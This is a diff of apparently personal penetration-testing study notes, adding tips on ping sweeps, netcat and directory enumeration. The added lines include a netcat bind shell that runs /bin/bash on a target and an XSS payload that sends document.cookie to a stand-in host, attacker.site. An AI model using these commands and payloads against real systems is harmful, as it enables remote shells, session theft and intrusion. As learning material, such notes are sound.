@@ -106,7 +106,7 @@
 ----------------
 ## Penetration Testing 
 ### Infomration Gathering & Scanning
-- Subdomain Enumeration
+- Subdomain Enumeration 
   - `cert.sh` - By far the best, a website that outputs TONS of subdomains based on certs domain checks
   - Go to a target site's cert details in the browser, it will show other subdomains as well if it's a shared cert
     - Careful from wildcard certs as they will return a subdomain for anything searched/ quiered. Ex: notrealsub.google.com will return valid if wildcard cert is on it.
@@ -114,6 +114,7 @@
   - `VirusTotal.com` search for a domain 
 
 - Ping Sweep: Used to create a map of a network
+  - IMPORTANT: Use two tools to confirm everything is good, fping AND nmap. Nmap, if you don't need output remove /dev/null
   - nmap is the defacto choice, as it allows you to input a list of ip ranges and much more
     - `nmap -sn 10.10.10.3-222`    
     - To force nmap os detection of a host even if it returns an error, try nmap -Pn -O TARGETIP (Note: This is very noisy)
@@ -121,7 +122,7 @@
   - `fping -a -g IPRANGE`
     - `-a` flag, we want to see only hosts that are available (alive)
     - `-g` flag, we want this a ping sweep and not standard ping request
-    - To hide offline hosts error messages use `2>/dev/null` at the end of the command ex: `fping -a -g 10.10.10.2 10.10.10.222 2>/dev/null` will show us only valid and alive hosts
+    - To hide offline hosts error messages use `2>/dev/null` at the end of the command ex: `fping -a -g 10.10.10.2 10.10.10.222 2>/dev/null` will show us only valid and alive hosts (CAN BACKFIRE, sometimes skips hosts with all ports closed)
 
 - Port Scanning
   - `-sS` flag - Stealth scanning in nmap is decent against firewalls but can still be detected by some IDS. It's a SYN scan that drops the 3-handshake communication before connecting, which makes the service on the port unable of detecting it. 
@@ -194,11 +195,31 @@
   - `POST` parameters (form data) only work in the **message body**
    
   
-  
+### Helpful Commands
+- `nmap -sn 10.10.10.22/24 | grep -oP '(?<=Nmap scan report for )[^ ]*'` Clean nmap ping sweep
+- `nc -v 127.0.0.1 8888` will let us contact a listening port on the target adress here localhost. This is not to be confused with the listener we typical use in reverse shells `nc nvlp 8888`. The first command is used to call the second command and establish connection.
+- For a simple shell if target host has nc:
+  - On target host: `nc -nvlp 1337 -e /bin/bash` where `-e` executes any command.
+  - On our machine: `nc -v 127.0.0.1 1337` of course, instead of local host insert the target IP.
+
 
     
-    
-    
+### Good to Know
+- Backps are typically stored in .bak, .old, .txt, and .xxx. So if we want to find any backups on a site run gobuster against those.c
+- Directory Enumeration
+  - If gobuster/ dirb are being blocked, you might need a User Agent to enmulate browser traffic and snag some dirs. Ex: `dirb http://targetsite.site -a "Mozilla/ browser agent we copied from an online source"`
+  - Adding a cookie can give more results with gobuster/ dirbuster. EX: `dirb http://targetsite.site -c "COOKIE:XYZ"` copy the 
+  - Adding a basic auth can also bring up more results `-U` in gobuster, and in dirb: `dirb http://targetsite.site -u "admin:password"`
+  - `-x txt,php,/` to include directories with the file extensions search in gobuster.
+- XSS: stealing cookie content and sending it to an attacker
+  - ```html
+    <script>
+    var i = new Image();
+    i.src="http://attacker.site/log.php?q="+document.cookie; 
+    </script
+    ```
+    - NOTE: the log.php file is a simple scrip tthat saves files on the attacker machine
+
   
   
 
